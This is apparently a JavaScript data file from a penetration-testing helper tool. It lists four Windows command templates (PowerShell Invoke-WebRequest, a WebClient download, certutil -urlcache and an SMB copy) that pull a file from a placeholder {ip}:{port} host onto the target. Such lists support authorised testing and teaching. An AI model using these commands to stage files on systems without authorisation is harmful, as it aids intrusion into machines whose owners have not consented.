export default [
  {
    name: 'PowerShell - IWR',
    command:
      'powershell.exe -Command "Invoke-WebRequest -Uri http://{ip}:{port}/{source} -OutFile {destination}"',
  },
  {
    name: 'PowerShell - IEX',
    command:
      'powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile(\'http://{ip}:{port}/{source}\', {destination})"',
  },
  {
    name: 'CMD - Certutil',
    command:
      'certutil.exe -urlcache -split -f http://{ip}:{port}/{source} {destination}',
  },
  {
    name: 'CMD - SMB',
    command: 'copy \\\\{ip}\\files\\{source}\\{destination}',
  },
];
